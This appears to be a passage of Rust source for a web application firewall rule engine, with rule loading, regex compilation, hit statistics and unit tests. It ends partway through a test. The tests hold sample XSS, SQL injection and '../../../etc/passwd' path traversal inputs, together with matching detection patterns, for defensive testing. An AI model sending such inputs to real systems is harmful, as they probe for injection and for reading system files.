use dashmap::DashMap;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};

// ============================================================================
// Rule Data Model
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
#[serde(rename_all = "snake_case")]
pub enum RuleCategory {
    Xss,
    SqlInjection,
    Rce,
    Lfi,
    Rfi,
    PathTraversal,
    Ssti,
    Xxe,
    CommandInjection,
    Scanner,
    Bot,
    HttpSmuggling,
    SessionFixation,
    Csrf,
    ApiAbuse,
    PhpAttack,
    JavaAttack,
    NodejsAttack,
    WordpressAttack,
    Deserialization,
    CveExploit,
    BotSignature,
    ProtocolValidation,
    MethodEnforcement,
    RequestAnomaly,
    Custom,
}

impl RuleCategory {
    pub fn as_str(&self) -> &'static str {
        match self {
            RuleCategory::Xss => "xss",
            RuleCategory::SqlInjection => "sql_injection",
            RuleCategory::Rce => "rce",
            RuleCategory::Lfi => "lfi",
            RuleCategory::Rfi => "rfi",
            RuleCategory::PathTraversal => "path_traversal",
            RuleCategory::Ssti => "ssti",
            RuleCategory::Xxe => "xxe",
            RuleCategory::CommandInjection => "command_injection",
            RuleCategory::Scanner => "scanner",
            RuleCategory::Bot => "bot",
            RuleCategory::HttpSmuggling => "http_smuggling",
            RuleCategory::SessionFixation => "session_fixation",
            RuleCategory::Csrf => "csrf",
            RuleCategory::ApiAbuse => "api_abuse",
            RuleCategory::PhpAttack => "php_attack",
            RuleCategory::JavaAttack => "java_attack",
            RuleCategory::NodejsAttack => "nodejs_attack",
            RuleCategory::WordpressAttack => "wordpress_attack",
            RuleCategory::Deserialization => "deserialization",
            RuleCategory::CveExploit => "cve_exploit",
            RuleCategory::BotSignature => "bot_signature",
            RuleCategory::ProtocolValidation => "protocol_validation",
            RuleCategory::MethodEnforcement => "method_enforcement",
            RuleCategory::RequestAnomaly => "request_anomaly",
            RuleCategory::Custom => "custom",
        }
    }

    pub fn from_str(s: &str) -> Option<Self> {
        match s {
            "xss" => Some(RuleCategory::Xss),
            "sql_injection" => Some(RuleCategory::SqlInjection),
            "rce" => Some(RuleCategory::Rce),
            "lfi" => Some(RuleCategory::Lfi),
            "rfi" => Some(RuleCategory::Rfi),
            "path_traversal" => Some(RuleCategory::PathTraversal),
            "ssti" => Some(RuleCategory::Ssti),
            "xxe" => Some(RuleCategory::Xxe),
            "command_injection" => Some(RuleCategory::CommandInjection),
            "scanner" => Some(RuleCategory::Scanner),
            "bot" => Some(RuleCategory::Bot),
            "http_smuggling" => Some(RuleCategory::HttpSmuggling),
            "session_fixation" => Some(RuleCategory::SessionFixation),
            "csrf" => Some(RuleCategory::Csrf),
            "api_abuse" => Some(RuleCategory::ApiAbuse),
            "php_attack" => Some(RuleCategory::PhpAttack),
            "java_attack" => Some(RuleCategory::JavaAttack),
            "nodejs_attack" => Some(RuleCategory::NodejsAttack),
            "wordpress_attack" => Some(RuleCategory::WordpressAttack),
            "deserialization" => Some(RuleCategory::Deserialization),
            "cve_exploit" => Some(RuleCategory::CveExploit),
            "bot_signature" => Some(RuleCategory::BotSignature),
            "protocol_validation" => Some(RuleCategory::ProtocolValidation),
            "method_enforcement" => Some(RuleCategory::MethodEnforcement),
            "request_anomaly" => Some(RuleCategory::RequestAnomaly),
            "custom" => Some(RuleCategory::Custom),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Rule {
    pub id: u64,
    pub category: RuleCategory,
    pub paranoia_level: u8,
    pub severity: String,
    pub description: String,
    pub pattern: String,
    #[serde(default)]
    pub mitre_id: Option<String>,
    #[serde(default = "default_enabled")]
    pub enabled: bool,
}

fn default_enabled() -> bool {
    true
}

#[derive(Debug, Clone)]
pub struct RuleMatch {
    pub rule: Rule,
    pub matched_text: String,
    pub match_position: Option<(usize, usize)>,
}

// ============================================================================
// RuleLoader
// ============================================================================

pub struct RuleLoader {
    directories: Vec<PathBuf>,
    max_paranoia_level: u8,
}

impl RuleLoader {
    pub fn new(directories: Vec<PathBuf>, max_paranoia_level: u8) -> Self {
        RuleLoader {
            directories,
            max_paranoia_level,
        }
    }

    pub fn set_directories(&mut self, directories: Vec<PathBuf>) {
        self.directories = directories;
    }

    pub fn set_max_paranoia_level(&mut self, level: u8) {
        self.max_paranoia_level = level;
    }

    pub fn load_rules(&self) -> Result<Vec<Rule>, String> {
        let mut all_rules = Vec::new();

        for dir in &self.directories {
            if !dir.exists() {
                tracing::warn!("Rule directory does not exist: {:?}", dir);
                continue;
            }

            let entries = fs::read_dir(dir)
                .map_err(|e| format!("Failed to read rule directory {:?}: {}", dir, e))?;

            for entry in entries {
                let entry = entry.map_err(|e| format!("Failed to read directory entry: {}", e))?;
                let path = entry.path();

                if path.is_file() && path.extension().map_or(false, |ext| ext == "json") {
                    let rules = Self::load_rules_from_file(&path)?;
                    all_rules.extend(rules);
                }
            }
        }

        Ok(all_rules
            .into_iter()
            .filter(|r| r.paranoia_level <= self.max_paranoia_level && r.enabled)
            .collect())
    }

    fn load_rules_from_file(path: &Path) -> Result<Vec<Rule>, String> {
        let content = fs::read_to_string(path)
            .map_err(|e| format!("Failed to read rule file {:?}: {}", path, e))?;

        let parsed = Self::parse_json_content(&content, path)?;
        Ok(parsed)
    }

    fn parse_json_content(content: &str, source: &Path) -> Result<Vec<Rule>, String> {
        if let Ok(rules) = serde_json::from_str::<Vec<Rule>>(content) {
            return Ok(rules);
        }

        if let Ok(wrapper) = serde_json::from_str::<HashMap<String, Vec<Rule>>>(content) {
            let mut all = Vec::new();
            for (_key, rules) in wrapper {
                all.extend(rules);
            }
            return Ok(all);
        }

        if let Ok(obj) = serde_json::from_str::<serde_json::Value>(content) {
            let mut all = Vec::new();
            Self::extract_rules_from_value(&obj, &mut all);
            if !all.is_empty() {
                return Ok(all);
            }
        }

        Err(format!(
            "Failed to parse rules from JSON file: {:?}",
            source
        ))
    }

    fn extract_rules_from_value(value: &serde_json::Value, rules: &mut Vec<Rule>) {
        if let Some(arr) = value.as_array() {
            for item in arr {
                if let Ok(rule) = serde_json::from_value::<Rule>(item.clone()) {
                    rules.push(rule);
                } else {
                    Self::extract_rules_from_value(item, rules);
                }
            }
        } else if let Some(obj) = value.as_object() {
            for (_key, val) in obj {
                Self::extract_rules_from_value(val, rules);
            }
        }
    }
}

// ============================================================================
// RuleCompiler
// ============================================================================

pub struct CompiledCategory {
    pub category: RuleCategory,
    pub regex: Regex,
    pub rule_ids: Vec<u64>,
}

pub struct RuleCompiler;

impl RuleCompiler {
    pub fn compile_rules(rules: &[Rule]) -> HashMap<RuleCategory, CompiledCategory> {
        let mut grouped: HashMap<RuleCategory, Vec<&Rule>> = HashMap::new();

        for rule in rules {
            grouped.entry(rule.category.clone()).or_default().push(rule);
        }

        let mut compiled = HashMap::new();

        for (category, category_rules) in grouped {
            if category_rules.is_empty() {
                continue;
            }

            let pattern = category_rules
                .iter()
                .map(|r| r.pattern.clone())
                .collect::<Vec<_>>()
                .join("|");

            let full_pattern = format!("(?i){}", pattern);

            match Regex::new(&full_pattern) {
                Ok(re) => {
                    let rule_ids: Vec<u64> = category_rules.iter().map(|r| r.id).collect();
                    compiled.insert(
                        category.clone(),
                        CompiledCategory {
                            category,
                            regex: re,
                            rule_ids,
                        },
                    );
                }
                Err(e) => {
                    tracing::error!("Failed to compile regex for category {:?}: {}", category, e);
                }
            }
        }

        compiled
    }

    pub fn compile_all_categories(rules: &[Rule]) -> HashMap<RuleCategory, CompiledCategory> {
        Self::compile_rules(rules)
    }
}

// ============================================================================
// RuleStatistics
// ============================================================================

#[derive(Debug, Clone, Serialize)]
pub struct RuleHitInfo {
    pub rule_id: u64,
    pub category: String,
    pub hit_count: u64,
    pub last_hit_timestamp: u64,
}

#[derive(Debug, Clone, Serialize)]
pub struct CategoryHitInfo {
    pub category: String,
    pub hit_count: u64,
}

pub struct RuleStatistics {
    rule_hits: DashMap<u64, AtomicU64>,
    category_hits: DashMap<String, AtomicU64>,
    rule_last_hit: DashMap<u64, AtomicU64>,
}

impl RuleStatistics {
    pub fn new() -> Self {
        RuleStatistics {
            rule_hits: DashMap::new(),
            category_hits: DashMap::new(),
            rule_last_hit: DashMap::new(),
        }
    }

    pub fn record_hit(&self, rule_id: u64, category: &str) {
        let rule_counter = self
            .rule_hits
            .entry(rule_id)
            .or_insert_with(|| AtomicU64::new(0));
        rule_counter.fetch_add(1, Ordering::Relaxed);

        let cat_counter = self
            .category_hits
            .entry(category.to_string())
            .or_insert_with(|| AtomicU64::new(0));
        cat_counter.fetch_add(1, Ordering::Relaxed);

        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        let ts_counter = self
            .rule_last_hit
            .entry(rule_id)
            .or_insert_with(|| AtomicU64::new(0));
        ts_counter.store(now, Ordering::Relaxed);
    }

    pub fn get_rule_hits(&self, rule_id: u64) -> u64 {
        self.rule_hits
            .get(&rule_id)
            .map(|e| e.value().load(Ordering::Relaxed))
            .unwrap_or(0)
    }

    pub fn get_category_hits(&self, category: &str) -> u64 {
        self.category_hits
            .get(category)
            .map(|e| e.value().load(Ordering::Relaxed))
            .unwrap_or(0)
    }

    pub fn get_all_rule_stats(&self) -> Vec<RuleHitInfo> {
        let mut stats = Vec::new();
        for entry in self.rule_hits.iter() {
            let rule_id = *entry.key();
            let hit_count = entry.value().load(Ordering::Relaxed);
            let last_hit = self
                .rule_last_hit
                .get(&rule_id)
                .map(|e| e.value().load(Ordering::Relaxed))
                .unwrap_or(0);

            stats.push(RuleHitInfo {
                rule_id,
                category: String::new(),
                hit_count,
                last_hit_timestamp: last_hit,
            });
        }
        stats.sort_by(|a, b| b.hit_count.cmp(&a.hit_count));
        stats
    }

    pub fn get_all_category_stats(&self) -> Vec<CategoryHitInfo> {
        let mut stats = Vec::new();
        for entry in self.category_hits.iter() {
            stats.push(CategoryHitInfo {
                category: entry.key().clone(),
                hit_count: entry.value().load(Ordering::Relaxed),
            });
        }
        stats.sort_by(|a, b| b.hit_count.cmp(&a.hit_count));
        stats
    }

    pub fn reset(&self) {
        self.rule_hits.clear();
        self.category_hits.clear();
        self.rule_last_hit.clear();
    }
}

// ============================================================================
// RuleEngine
// ============================================================================

pub struct WafRequest {
    pub url: String,
    pub method: String,
    pub headers: HashMap<String, String>,
    pub query_params: HashMap<String, String>,
    pub body: String,
    pub cookies: HashMap<String, String>,
}

impl WafRequest {
    pub fn to_detection_string(&self) -> String {
        let mut parts = Vec::new();
        parts.push(self.url.to_lowercase());
        parts.push(self.method.to_lowercase());

        for (k, v) in &self.headers {
            parts.push(format!("{}={}", k.to_lowercase(), v.to_lowercase()));
        }

        for (k, v) in &self.query_params {
            parts.push(format!("{}={}", k.to_lowercase(), v.to_lowercase()));
        }

        parts.push(self.body.to_lowercase());

        for (k, v) in &self.cookies {
            parts.push(format!("{}={}", k.to_lowercase(), v.to_lowercase()));
        }

        parts.join(" ")
    }
}

pub struct RuleEngine {
    rules: DashMap<u64, Rule>,
    compiled: DashMap<RuleCategory, CompiledCategory>,
    statistics: Arc<RuleStatistics>,
    paranoia_level: u8,
    loader_directories: Vec<PathBuf>,
}

impl RuleEngine {
    pub fn new(
        rules: Vec<Rule>,
        statistics: Arc<RuleStatistics>,
        paranoia_level: u8,
        loader_directories: Vec<PathBuf>,
    ) -> Self {
        let compiled = RuleCompiler::compile_rules(&rules);
        let rules_map = DashMap::new();
        let compiled_map = DashMap::new();

        for rule in &rules {
            rules_map.insert(rule.id, rule.clone());
        }

        for (cat, comp) in compiled {
            compiled_map.insert(cat, comp);
        }

        RuleEngine {
            rules: rules_map,
            compiled: compiled_map,
            statistics,
            paranoia_level,
            loader_directories,
        }
    }

    pub fn match_request(&self, request: &WafRequest) -> Vec<RuleMatch> {
        let detection_text = request.to_detection_string();
        let mut matches = Vec::new();

        for entry in self.compiled.iter() {
            let _category = entry.key();
            let compiled = entry.value();

            if let Some(mat) = compiled.regex.find(&detection_text) {
                let matched_text = mat.as_str().to_string();
                let match_position = Some((mat.start(), mat.end()));

                for rule_id in &compiled.rule_ids {
                    if let Some(rule_ref) = self.rules.get(rule_id) {
                        let rule = rule_ref.value().clone();
                        self.statistics.record_hit(rule.id, rule.category.as_str());
                        matches.push(RuleMatch {
                            rule,
                            matched_text: matched_text.clone(),
                            match_position,
                        });
                    }
                }
            }
        }

        matches
    }

    pub fn has_match(&self, request: &WafRequest) -> bool {
        let detection_text = request.to_detection_string();

        for entry in self.compiled.iter() {
            let compiled = entry.value();
            if compiled.regex.is_match(&detection_text) {
                return true;
            }
        }

        false
    }

    pub fn get_rules(&self) -> Vec<Rule> {
        self.rules
            .iter()
            .map(|entry| entry.value().clone())
            .collect()
    }

    pub fn get_rule(&self, id: u64) -> Option<Rule> {
        self.rules.get(&id).map(|e| e.value().clone())
    }

    pub fn get_categories(&self) -> Vec<RuleCategory> {
        self.compiled
            .iter()
            .map(|entry| entry.key().clone())
            .collect()
    }

    pub fn get_statistics(&self) -> Arc<RuleStatistics> {
        self.statistics.clone()
    }

    pub fn get_paranoia_level(&self) -> u8 {
        self.paranoia_level
    }
}

// ============================================================================
// RuleManager
// ============================================================================

pub struct RuleManager {
    engine: DashMap<String, Arc<RuleEngine>>,
    statistics: Arc<RuleStatistics>,
    paranoia_level: u8,
    loader_directories: Vec<PathBuf>,
}

impl RuleManager {
    pub fn new(
        initial_rules: Vec<Rule>,
        paranoia_level: u8,
        loader_directories: Vec<PathBuf>,
    ) -> Self {
        let stats = Arc::new(RuleStatistics::new());
        let engine = Arc::new(RuleEngine::new(
            initial_rules,
            stats.clone(),
            paranoia_level,
            loader_directories.clone(),
        ));

        let engine_map = DashMap::new();
        engine_map.insert("default".to_string(), engine);

        RuleManager {
            engine: engine_map,
            statistics: stats,
            paranoia_level,
            loader_directories,
        }
    }

    pub fn get_engine(&self) -> Arc<RuleEngine> {
        self.engine
            .get("default")
            .map(|e| e.value().clone())
            .unwrap_or_else(|| {
                let empty_engine = Arc::new(RuleEngine::new(
                    vec![],
                    self.statistics.clone(),
                    self.paranoia_level,
                    self.loader_directories.clone(),
                ));
                self.engine
                    .insert("default".to_string(), empty_engine.clone());
                empty_engine
            })
    }

    pub fn reload_rules(&self) -> Result<usize, String> {
        let loader = RuleLoader::new(self.loader_directories.clone(), self.paranoia_level);

        let rules = loader.load_rules()?;
        let rule_count = rules.len();

        let new_engine = Arc::new(RuleEngine::new(
            rules,
            self.statistics.clone(),
            self.paranoia_level,
            self.loader_directories.clone(),
        ));

        self.engine.insert("default".to_string(), new_engine);

        tracing::info!("Rule hot-reload completed: {} rules loaded", rule_count);
        Ok(rule_count)
    }

    pub fn enable_rule(&self, rule_id: u64) -> Result<(), String> {
        let engine = self.get_engine();
        let result = if let Some(mut rule) = engine.rules.get_mut(&rule_id) {
            rule.enabled = true;

            let all_rules: Vec<Rule> = engine.get_rules();
            let active_rules: Vec<Rule> = all_rules.into_iter().filter(|r| r.enabled).collect();
            let compiled = RuleCompiler::compile_rules(&active_rules);

            engine.compiled.clear();
            for (cat, comp) in compiled {
                engine.compiled.insert(cat, comp);
            }

            Ok(())
        } else {
            Err(format!("Rule with id {} not found", rule_id))
        };
        result
    }

    pub fn disable_rule(&self, rule_id: u64) -> Result<(), String> {
        let engine = self.get_engine();
        let result = if let Some(mut rule) = engine.rules.get_mut(&rule_id) {
            rule.enabled = false;

            let all_rules: Vec<Rule> = engine.get_rules();
            let active_rules: Vec<Rule> = all_rules.into_iter().filter(|r| r.enabled).collect();
            let compiled = RuleCompiler::compile_rules(&active_rules);

            engine.compiled.clear();
            for (cat, comp) in compiled {
                engine.compiled.insert(cat, comp);
            }

            Ok(())
        } else {
            Err(format!("Rule with id {} not found", rule_id))
        };
        result
    }

    pub fn enable_category(&self, category: &RuleCategory) -> Result<(), String> {
        let engine = self.get_engine();
        let mut found = false;

        for mut entry in engine.rules.iter_mut() {
            if entry.value().category == *category {
                entry.value_mut().enabled = true;
                found = true;
            }
        }

        if found {
            let all_rules: Vec<Rule> = engine.get_rules();
            let active_rules: Vec<Rule> = all_rules.into_iter().filter(|r| r.enabled).collect();
            let compiled = RuleCompiler::compile_rules(&active_rules);

            engine.compiled.clear();
            for (cat, comp) in compiled {
                engine.compiled.insert(cat, comp);
            }

            Ok(())
        } else {
            Err(format!("No rules found for category {:?}", category))
        }
    }

    pub fn disable_category(&self, category: &RuleCategory) -> Result<(), String> {
        let engine = self.get_engine();
        let mut found = false;

        for mut entry in engine.rules.iter_mut() {
            if entry.value().category == *category {
                entry.value_mut().enabled = false;
                found = true;
            }
        }

        if found {
            let all_rules: Vec<Rule> = engine.get_rules();
            let active_rules: Vec<Rule> = all_rules.into_iter().filter(|r| r.enabled).collect();
            let compiled = RuleCompiler::compile_rules(&active_rules);

            engine.compiled.clear();
            for (cat, comp) in compiled {
                engine.compiled.insert(cat, comp);
            }

            Ok(())
        } else {
            Err(format!("No rules found for category {:?}", category))
        }
    }

    pub fn set_paranoia_level(&self, level: u8) -> Result<usize, String> {
        self.paranoia_level;
        let loader = RuleLoader::new(self.loader_directories.clone(), level);
        let rules = loader.load_rules()?;
        let rule_count = rules.len();

        let new_engine = Arc::new(RuleEngine::new(
            rules,
            self.statistics.clone(),
            level,
            self.loader_directories.clone(),
        ));

        self.engine.insert("default".to_string(), new_engine);

        tracing::info!(
            "Paranoia level changed to {}: {} rules loaded",
            level,
            rule_count
        );
        Ok(rule_count)
    }

    pub fn get_statistics(&self) -> Arc<RuleStatistics> {
        self.statistics.clone()
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_rule(
        id: u64,
        category: RuleCategory,
        pattern: &str,
        paranoia_level: u8,
    ) -> Rule {
        Rule {
            id,
            category,
            paranoia_level,
            severity: "high".to_string(),
            description: format!("Test rule {}", id),
            pattern: pattern.to_string(),
            mitre_id: None,
            enabled: true,
        }
    }

    #[test]
    fn test_rule_category_conversion() {
        assert_eq!(RuleCategory::Xss.as_str(), "xss");
        assert_eq!(RuleCategory::SqlInjection.as_str(), "sql_injection");
        assert_eq!(RuleCategory::Rce.as_str(), "rce");
        assert_eq!(RuleCategory::PathTraversal.as_str(), "path_traversal");

        assert_eq!(RuleCategory::from_str("xss"), Some(RuleCategory::Xss));
        assert_eq!(
            RuleCategory::from_str("sql_injection"),
            Some(RuleCategory::SqlInjection)
        );
        assert_eq!(RuleCategory::from_str("rce"), Some(RuleCategory::Rce));
        assert_eq!(RuleCategory::from_str("unknown"), None);
    }

    #[test]
    fn test_rule_serialization() {
        let rule = create_test_rule(1, RuleCategory::Xss, "<script>", 1);
        let json = serde_json::to_string(&rule).unwrap();
        let deserialized: Rule = serde_json::from_str(&json).unwrap();

        assert_eq!(deserialized.id, 1);
        assert_eq!(deserialized.category, RuleCategory::Xss);
        assert_eq!(deserialized.pattern, "<script>");
        assert_eq!(deserialized.paranoia_level, 1);
        assert!(deserialized.enabled);
    }

    #[test]
    fn test_rule_loader_empty_directories() {
        let loader = RuleLoader::new(vec![], 1);
        let rules = loader.load_rules().unwrap();
        assert!(rules.is_empty());
    }

    #[test]
    fn test_rule_compiler_basic() {
        let rules = vec![
            create_test_rule(1, RuleCategory::Xss, "<script>", 1),
            create_test_rule(2, RuleCategory::Xss, "</script>", 1),
            create_test_rule(3, RuleCategory::SqlInjection, "union select", 1),
        ];

        let compiled = RuleCompiler::compile_rules(&rules);

        assert!(compiled.contains_key(&RuleCategory::Xss));
        assert!(compiled.contains_key(&RuleCategory::SqlInjection));

        let xss_compiled = compiled.get(&RuleCategory::Xss).unwrap();
        assert_eq!(xss_compiled.rule_ids.len(), 2);
        assert!(xss_compiled.regex.is_match("<script>alert(1)</script>"));

        let sqli_compiled = compiled.get(&RuleCategory::SqlInjection).unwrap();
        assert_eq!(sqli_compiled.rule_ids.len(), 1);
        assert!(sqli_compiled
            .regex
            .is_match("id=1 union select * from users"));
    }

    #[test]
    fn test_rule_compiler_case_insensitive() {
        let rules = vec![create_test_rule(1, RuleCategory::Xss, "<script>", 1)];
        let compiled = RuleCompiler::compile_rules(&rules);

        let xss_compiled = compiled.get(&RuleCategory::Xss).unwrap();
        assert!(xss_compiled.regex.is_match("<SCRIPT>"));
        assert!(xss_compiled.regex.is_match("<Script>"));
        assert!(xss_compiled.regex.is_match("<script>"));
    }

    #[test]
    fn test_rule_statistics() {
        let stats = RuleStatistics::new();

        stats.record_hit(1, "xss");
        stats.record_hit(1, "xss");
        stats.record_hit(2, "sql_injection");

        assert_eq!(stats.get_rule_hits(1), 2);
        assert_eq!(stats.get_rule_hits(2), 1);
        assert_eq!(stats.get_rule_hits(3), 0);

        assert_eq!(stats.get_category_hits("xss"), 2);
        assert_eq!(stats.get_category_hits("sql_injection"), 1);
        assert_eq!(stats.get_category_hits("rce"), 0);
    }

    #[test]
    fn test_rule_statistics_category_aggregation() {
        let stats = RuleStatistics::new();

        stats.record_hit(1, "xss");
        stats.record_hit(2, "xss");
        stats.record_hit(3, "xss");

        assert_eq!(stats.get_category_hits("xss"), 3);

        let cat_stats = stats.get_all_category_stats();
        assert_eq!(cat_stats.len(), 1);
        assert_eq!(cat_stats[0].category, "xss");
        assert_eq!(cat_stats[0].hit_count, 3);
    }

    #[test]
    fn test_rule_statistics_reset() {
        let stats = RuleStatistics::new();

        stats.record_hit(1, "xss");
        stats.record_hit(2, "sql_injection");
        stats.reset();

        assert_eq!(stats.get_rule_hits(1), 0);
        assert_eq!(stats.get_rule_hits(2), 0);
        assert_eq!(stats.get_category_hits("xss"), 0);
    }

    #[test]
    fn test_waf_request_detection_string() {
        let mut headers = HashMap::new();
        headers.insert("User-Agent".to_string(), "Mozilla/5.0".to_string());

        let request = WafRequest {
            url: "/test?param=value".to_string(),
            method: "GET".to_string(),
            headers,
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let detection = request.to_detection_string();
        assert!(detection.contains("/test?param=value"));
        assert!(detection.contains("get"));
        assert!(detection.contains("user-agent=mozilla/5.0"));
    }

    #[test]
    fn test_rule_engine_xss_detection() {
        let rules = vec![
            create_test_rule(1, RuleCategory::Xss, r#"<script[\s\S]*?>"#, 1),
            create_test_rule(2, RuleCategory::Xss, r#"</script>"#, 1),
            create_test_rule(3, RuleCategory::Xss, r#"javascript\s*:"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let request = WafRequest {
            url: "/search?q=<script>alert(1)</script>".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches = engine.match_request(&request);
        assert!(!matches.is_empty());

        let has_xss = matches.iter().any(|m| m.rule.category == RuleCategory::Xss);
        assert!(has_xss);
    }

    #[test]
    fn test_rule_engine_sql_injection_detection() {
        let rules = vec![
            create_test_rule(
                10,
                RuleCategory::SqlInjection,
                r#"union\s+(all\s+)?select"#,
                1,
            ),
            create_test_rule(11, RuleCategory::SqlInjection, r#"or\s+1\s*=\s*1"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let request = WafRequest {
            url: "/api/users?id=1 union select * from passwords".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches = engine.match_request(&request);
        assert!(!matches.is_empty());

        let has_sqli = matches
            .iter()
            .any(|m| m.rule.category == RuleCategory::SqlInjection);
        assert!(has_sqli);
    }

    #[test]
    fn test_rule_engine_path_traversal_detection() {
        let rules = vec![
            create_test_rule(20, RuleCategory::PathTraversal, r#"\.\./"#, 1),
            create_test_rule(21, RuleCategory::PathTraversal, r#"etc/passwd"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let request = WafRequest {
            url: "/static/../../../etc/passwd".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches = engine.match_request(&request);
        assert!(!matches.is_empty());
    }

    #[test]
    fn test_rule_engine_normal_request() {
        let rules = vec![
            create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1),
            create_test_rule(10, RuleCategory::SqlInjection, r#"union select"#, 1),
            create_test_rule(20, RuleCategory::PathTraversal, r#"\.\./"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let request = WafRequest {
            url: "/api/products?category=electronics".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: "page=1&limit=20".to_string(),
            cookies: HashMap::new(),
        };

        let matches = engine.match_request(&request);
        assert!(matches.is_empty());
    }

    #[test]
    fn test_rule_engine_has_match() {
        let rules = vec![create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1)];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let malicious_request = WafRequest {
            url: "/page?content=<script>".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        assert!(engine.has_match(&malicious_request));

        let normal_request = WafRequest {
            url: "/page?content=hello".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        assert!(!engine.has_match(&normal_request));
    }

    #[test]
    fn test_rule_engine_statistics_recording() {
        let rules = vec![create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1)];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules.clone(), stats.clone(), 1, vec![]);

        let request = WafRequest {
            url: "/test?<script>".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        engine.match_request(&request);
        engine.match_request(&request);

        assert_eq!(stats.get_rule_hits(1), 2);
        assert_eq!(stats.get_category_hits("xss"), 2);
    }

    #[test]
    fn test_rule_manager_creation() {
        let rules = vec![
            create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1),
            create_test_rule(2, RuleCategory::SqlInjection, r#"union select"#, 1),
        ];

        let manager = RuleManager::new(rules, 1, vec![]);
        let engine = manager.get_engine();

        assert_eq!(engine.get_rules().len(), 2);
    }

    #[test]
    fn test_rule_manager_disable_rule() {
        let rules = vec![
            create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1),
            create_test_rule(2, RuleCategory::Xss, r#"</script>"#, 1),
        ];

        let manager = RuleManager::new(rules, 1, vec![]);
        manager.disable_rule(1).unwrap();

        let request = WafRequest {
            url: "/test?<script>".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches = manager.get_engine().match_request(&request);
        assert!(matches.is_empty() || matches.iter().all(|m| m.rule.id != 1));
    }

    #[test]
    fn test_rule_manager_disable_category() {
        let rules = vec![
            create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1),
            create_test_rule(2, RuleCategory::SqlInjection, r#"union select"#, 1),
        ];

        let manager = RuleManager::new(rules, 1, vec![]);
        manager.disable_category(&RuleCategory::Xss).unwrap();

        let xss_request = WafRequest {
            url: "/test?<script>".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches = manager.get_engine().match_request(&xss_request);
        let has_xss = matches.iter().any(|m| m.rule.category == RuleCategory::Xss);
        assert!(!has_xss);
    }

    #[test]
    fn test_rule_manager_enable_category_after_disable() {
        let rules = vec![create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1)];

        let manager = RuleManager::new(rules, 1, vec![]);
        manager.disable_category(&RuleCategory::Xss).unwrap();
        manager.enable_category(&RuleCategory::Xss).unwrap();

        let xss_request = WafRequest {
            url: "/test?<script>".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches = manager.get_engine().match_request(&xss_request);
        assert!(!matches.is_empty());
    }

    #[test]
    fn test_rule_manager_disable_nonexistent_rule() {
        let rules = vec![create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1)];
        let manager = RuleManager::new(rules, 1, vec![]);

        let result = manager.disable_rule(999);
        assert!(result.is_err());
    }

    #[test]
    fn test_paranoia_level_filtering() {
        let rules = vec![
            create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1),
            create_test_rule(2, RuleCategory::Xss, r#"javascript:"#, 2),
            create_test_rule(3, RuleCategory::Xss, r#"eval\s*\("#, 3),
        ];

        let stats = Arc::new(RuleStatistics::new());

        let engine_level1 = RuleEngine::new(
            rules
                .iter()
                .filter(|r| r.paranoia_level <= 1)
                .cloned()
                .collect(),
            stats.clone(),
            1,
            vec![],
        );

        let engine_level3 = RuleEngine::new(
            rules
                .iter()
                .filter(|r| r.paranoia_level <= 3)
                .cloned()
                .collect(),
            stats.clone(),
            3,
            vec![],
        );

        let xss_script_request = WafRequest {
            url: "/test?<script>".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches_l1 = engine_level1.match_request(&xss_script_request);
        assert!(!matches_l1.is_empty());

        let xss_eval_request = WafRequest {
